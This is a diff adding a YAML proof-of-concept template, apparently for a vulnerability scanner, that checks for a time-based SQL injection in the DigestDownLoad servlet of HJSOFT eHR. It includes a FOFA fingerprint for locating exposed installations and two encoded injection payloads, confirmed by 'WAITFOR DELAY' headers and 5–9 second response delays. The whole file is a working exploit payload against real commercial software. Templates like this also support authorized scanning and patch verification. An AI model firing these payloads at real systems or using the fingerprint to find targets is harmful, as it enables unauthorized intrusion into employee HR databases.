@@ -1,0 +1,19 @@
+id: poc-yaml-hjsoft-ehr-digestdownload-sqli
+info:
+  name: 宏景eHR DigestDownLoad SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 宏景eHR
+  fofa: app="HJSOFT-HCM"
+requests:
+- method: GET
+  path: /servlet/DigestDownLoad?type=original&id=FAAor8PAATTP2HJBPAATTPponI4yXkPAATTP2HJBPAATTPcVlfbP56PAATTP2HJFPAATTPPAATTP2HJFPAATTPkfU7lSDv5nFnpafrEPAATTP3HJDPAATTP
+  expression: status_code == 302 && contains(headers,"WAITFOR DELAY") && duration
+    >= 5 && duration <= 7
+- method: GET
+  path: /servlet/DigestDownLoad?type=original&id=FAAor8PAATTP2HJBPAATTPponI4yXkPAATTP2HJBPAATTPcVlfbHOxpIStWPAATTP2HJFPAATTPTiXTUlOUQRdO4PAATTP3HJDPAATTP
+  expression: status_code == 302 && contains(headers,"WAITFOR DELAY") && duration
+    >= 7 && duration <= 9
+variables: {}
+transport: http
